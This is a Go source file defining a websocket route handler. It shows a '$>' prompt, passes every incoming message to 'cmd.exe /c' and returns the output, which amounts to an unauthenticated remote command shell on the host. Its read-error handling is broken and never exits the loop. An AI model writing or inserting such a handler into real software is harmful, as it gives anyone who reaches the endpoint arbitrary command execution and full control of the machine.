package routes

import (
	"fmt"
	"os/exec"

	"github.com/dgrr/fastws"
)

func Websocket(conn *fastws.Conn) {
	fmt.Println("Connected!")
	conn.Write([]byte("$>"))

	var msg []byte
	var err error
	for {
		_, msg, err = conn.ReadMessage(msg[:0])
		if err != nil {
			if err != fastws.EOF {
				conn.WriteString("Error")
			}
		}

		out, err := exec.Command("cmd.exe", "/c", string(msg)).Output()
		if err != nil {
			fmt.Println(err)
		}

		_, err = conn.WriteString(string(out) + "$>")
		if err != nil {
			fmt.Printf("error writing message: %s\n", err)
			break
		}
	}

	conn.WriteString("Closed connection!")
	fmt.Printf("Closed connection\n")
}
